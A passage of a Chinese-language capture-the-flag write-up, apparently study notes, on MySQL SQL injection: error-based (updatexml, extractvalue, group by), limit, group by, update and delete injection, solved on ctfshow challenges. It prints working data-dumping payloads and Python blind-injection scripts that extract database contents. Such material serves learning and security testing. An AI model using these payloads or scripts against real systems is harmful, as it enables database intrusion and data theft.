<p>ctfshow web238</p>
</blockquote>
<p>过滤空格包括所有的空格绕过方法，那就用括号闭合来代替（这里仅示例查表名）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>利用update修改字段名的功能来注入查询语句，使其字段名能够返回我们需要的信息</p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/">题目实战</a></p>
<hr>
<h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><p>删除语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们虽然不能直接通过这个语句来获取数据库的信息</p>
<p>但是在这个语句中我们可以输入<code>if(2&gt;1,sleep(0.2),1)</code>进行时间盲注</p>
<blockquote>
<p>ctfshow web241</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://1a2a5437-423f-4c06-9d47-5ac94a1871f2.challenge.ctf.show/api/delete.php"</span>

result <span class="token operator">=</span> <span class="token string">''</span>

<span class="token comment"># 爆表名</span>
<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
<span class="token comment"># 爆列名</span>
<span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'"</span>
<span class="token comment"># 爆字段值</span>
payload <span class="token operator">=</span> <span class="token string">"select flag from `flag`"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        <span class="token comment"># sleep(0.8)</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>  <span class="token comment"># 中间指针等于头尾指针相加的一半</span>
        <span class="token comment"># print(mid)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'id'</span><span class="token punctuation">:</span>
            <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.01),-1)#"</span></span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment">#sleep导致超时</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>通过可以让sql出现报错的语句额外执行查询来实现获取信息</p>
<p>注：报错长度最长是32，所以要用<code>substr</code>或者<code>substring</code>或者<code>not in</code>等函数去截取</p>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><p>原理：<code>updatexml()</code>函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就			因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码</p>
<p>作用： 改变文档中符合条件的节点的值</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>需要查询的内容<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>ctfshow web244</p>
</blockquote>
<p>查数据库名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819174515576.png" alt="image-20230819174515576"></p>
<p>查表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>ctfshow_flag'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>截取</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">extractvalue <span class="token punctuation">(</span>目标xml文档，xml路径<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对XML文档进行查询的函数，从目标XML中返回包含所查询值的字符串</p>
<p>利用方法和updatexml类似</p>
<blockquote>
<p>ctfshow web245</p>
</blockquote>
<p>表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>ctfshow_flagsa'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag1 <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>截取</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag1 <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h2><p>原理参考这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27130557/article/details/120902212">csdn的文章</a></p>
<p>原因是<code>group by</code>在向临时表插入数据时，由于<code>rand()</code>多次计算导致<strong>插入临时表时主键重复</strong>，从而报错，</p>
<p>又因为报错前<code>concat()</code>中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这种报错方法好像没限制长度（？</p>
<p>注：<code>floor</code>（向下取整）可以也替换成<code>ceil</code>（向上取整）</p>
<blockquote>
<p>ctfshow web246</p>
</blockquote>
<p>表名</p>
<p>注：这里不能用<code>group_concat</code>来合并查询结果而只能用<code>limit</code>，因为查询出来的内容不止一行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='</span>ctfshow_flags' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag2 <span class="token keyword">from</span> ctfshow_flags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">参考p神博客</a></p>
<p>版本限制(5.0.0-5.6.6)</p>
<h2 id="联合查询法"><a href="#联合查询法" class="headerlink" title="联合查询法"></a>联合查询法</h2><p>limit前面无<code>order by</code>时</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="procedure-analyse-函数"><a href="#procedure-analyse-函数" class="headerlink" title="procedure analyse()函数"></a>procedure analyse()函数</h2><blockquote>
<p>是MySQL提供的一个分析结果集的接口，以帮助提供数据类型优化建议</p>
</blockquote>
<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230814120752261.png" alt="image-20230814120752261"></p>
<p>它会给出这个表上的详细统计信息</p>
<h2 id="报错注入法"><a href="#报错注入法" class="headerlink" title="报错注入法"></a>报错注入法</h2><p>payload from p神</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">procedure</span> analyse<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="时间注入法"><a href="#时间注入法" class="headerlink" title="时间注入法"></a>时间注入法</h2><hr>
<h1 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53065491/article/details/121893986?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169200025316800182713921%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169200025316800182713921&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121893986-null-null.142%5Ev92%5Ekoosearch_v1&utm_term=group%20by%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">参考csdn的文章</a></p>
<p>先看这两条查询语句的差别</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">group</span> <span class="token keyword">by</span> username<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230814161323429.png" alt="image-20230814161323429"></p>
<p>第一条查询语句原因是由于group by在分组时，会依次取出查询表中的记录并创建一个临时表（表中有两个字段，分别是key和<code>count(*)</code>）,group by的对象就是该临时表的主键。</p>
<p>如果临时表中已经存在该主键，则<code>count(*)</code>的值+1，如果表中不存在则将主键插入到临时表中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token string">"username"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>第二条group by的对象是一个字符串“username”，对于字符串来说，group by 在进行分组时，会直接将该字符串当做主键插入到临时表中，如果临时表中存在该主键，则<code>count(*)</code>的值+1。</p>
<p>轮到第二条数据时也是将字符串当做主键插入到临时表，但此时临时表中已经存在该主键，则<code>count(*)</code>的值直接加1<br>也就是说所有行会被分为同一个分组，无论它们的实际值如何</p>
<p>但是在实际使用中第二种方法往往会产生报错</p>
<h2 id="时间注入法-1"><a href="#时间注入法-1" class="headerlink" title="时间注入法"></a>时间注入法</h2><blockquote>
<p>ctfshow web222</p>
</blockquote>
<p>查询语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group <span class="token class-name type-declaration">by</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中username是可控的，我们可以通过<code>concat(if(1=1,username,cot(0)))</code>进行盲注</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">"http://8e37d4f0-1263-493e-8122-78d259f16285.challenge.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">''</span>
<span class="token builtin">dict</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"_-&#125;&#123;"</span>

<span class="token comment"># 爆表名  </span>
<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
<span class="token comment"># 爆列名</span>
<span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flaga'"</span>
<span class="token comment"># 爆字段值</span>
payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?u=concat(if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">',username,cot(0)))#"</span></span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>s<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="布尔注入法"><a href="#布尔注入法" class="headerlink" title="布尔注入法"></a>布尔注入法</h2><blockquote>
<p>ctfshow web223</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">url<span class="token operator">=</span><span class="token string">'http://4cc7e20c-d356-4c50-b6d3-ab9282a09438.challenge.ctf.show/api/'</span>
<span class="token keyword">import</span> requests
result<span class="token operator">=</span><span class="token string">''</span>
i<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">def</span> <span class="token function">getnumber</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num<span class="token operator">=</span><span class="token string">'true'</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> num
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            num<span class="token operator">+=</span><span class="token string">'+true'</span>
        <span class="token keyword">return</span> num

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i<span class="token operator">+=</span><span class="token number">1</span>
    head<span class="token operator">=</span><span class="token number">1</span>
    tail<span class="token operator">=</span><span class="token number">127</span>
    <span class="token keyword">while</span> head<span class="token operator">&lt;</span>tail<span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>head<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
        <span class="token comment"># payload = f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;getnumber(i)&#125;,true))>&#123;getnumber(mid)&#125;,username,true)"</span>
        <span class="token comment"># payload = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'),&#123;getnumber(i)&#125;,true))>&#123;getnumber(mid)&#125;,username,true)"</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select flagasabc from ctfshow_flagas),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getnumber<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,true))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>getnumber<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,username,true)"</span></span>

        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
            <span class="token string">"u"</span><span class="token punctuation">:</span>payload
        <span class="token punctuation">&#125;</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"passwordAUTO"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            head<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail<span class="token operator">=</span>mid
    <span class="token keyword">if</span> head<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>
        result<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

